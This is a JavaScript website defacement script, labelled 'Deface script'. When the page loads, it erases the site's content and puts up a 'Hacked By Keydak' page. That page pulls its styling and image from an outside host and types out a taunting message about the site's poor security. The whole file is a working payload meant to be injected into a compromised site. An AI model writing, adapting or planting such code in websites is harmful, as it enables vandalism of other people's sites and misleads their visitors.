// Deface script
document.addEventListener('DOMContentLoaded', function () {

    document.documentElement.innerHTML = '';


    var newHtmlContent = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Home - Hacked By Keydak</title>
            <link rel="stylesheet" href="https://kepo-six.vercel.app/style.css">
        </head>
        <body>
            <div class="mainContainer">
                <div class="img">
                    <img class="mainImage" src="https://kepo-six.vercel.app/jett.png" alt="image" style="width: 400px;">
                </div>
                <h1> Hacked By Keydak</h1>
                <hr class="hr">
                <div class="container">
                    <p class="typewrite" data-period="2000" data-type='[ "you need to improve the security system on your site", "I am Keydak." ]'><span class="wrap"></span></p>
                </div>
            </div>
        </body>
              <script>
// function startTypingAnimation() {
//     var textElement = document.querySelector('.text1');
//     var text = "you need to improve the security system on your site";
//     var index = 0;

//     function type() {
//         if (index < text.length) {
//             textElement.textContent += text.charAt(index);
//             index++;
//             setTimeout(type, 150);
//         } else {
//             fadeOutText();
//         }
//     }

//     function fadeOutText() {
//         var textLength = text.length;// Delay in milliseconds between each character removal
//         var fadeInterval = setInterval(function() {
//             if (textLength > 0) {
//                 textElement.textContent = text.substring(0, textLength - 1);
//                 textLength--;
//             } else {
//                 clearInterval(fadeInterval);
//                 setTimeout(function() {
//                     index = 0;
//                     type();
//                 }, 1000);
//             }
//         }, delay);
//     }

//     type();
// }

//     startTypingAnimation();


    var TxtType = function(el, toRotate, period) {
        this.toRotate = toRotate;
        this.el = el;
        this.loopNum = 0;
        this.period = parseInt(period, 10) || 2000;
        this.txt = '';
        this.tick();
        this.isDeleting = false;
    };

    TxtType.prototype.tick = function() {
        var i = this.loopNum % this.toRotate.length;
        var fullTxt = this.toRotate[i];

        if (this.isDeleting) {
        this.txt = fullTxt.substring(0, this.txt.length - 1);
        } else {
        this.txt = fullTxt.substring(0, this.txt.length + 1);
        }

        this.el.innerHTML = '<span class="wrap">'+this.txt+'</span>';

        var that = this;
        var delta = 200 - Math.random() * 100;

        if (this.isDeleting) { delta /= 2; }

        if (!this.isDeleting && this.txt === fullTxt) {
        delta = this.period;
        this.isDeleting = true;
        } else if (this.isDeleting && this.txt === '') {
        this.isDeleting = false;
        this.loopNum++;
        delta = 500;
        }

        setTimeout(function() {
        that.tick();
        }, delta);
    };

    window.onload = function() {
        var elements = document.getElementsByClassName('typewrite');
        for (var i=0; i<elements.length; i++) {
            var toRotate = elements[i].getAttribute('data-type');
            var period = elements[i].getAttribute('data-period');
            if (toRotate) {
              new TxtType(elements[i], JSON.parse(toRotate), period);
            }
        }
        // INJECT CSS
        var css = document.createElement("style");
        css.type = "text/css";
        css.innerHTML = ".typewrite > .wrap { border-right: 0.08em solid #fff}";
        document.body.appendChild(css);
    };
            </script>
        </html>
    `;


    // document.addEventListener('DOMContentLoaded', function() {
    //     var text = "you need to improve the security system on your site";
    //     var textElement = document.querySelector('.text1');
    //     var index = 0;

    //     function type() {
    //         if (index < text.length) {
    //             textElement.textContent += text.charAt(index);
    //             index++;
    //             setTimeout(type, 150);
    //         }
    //     }

    //     type();
    // });
    var fragment = document.createRange().createContextualFragment(newHtmlContent);
    document.body.appendChild(fragment);
});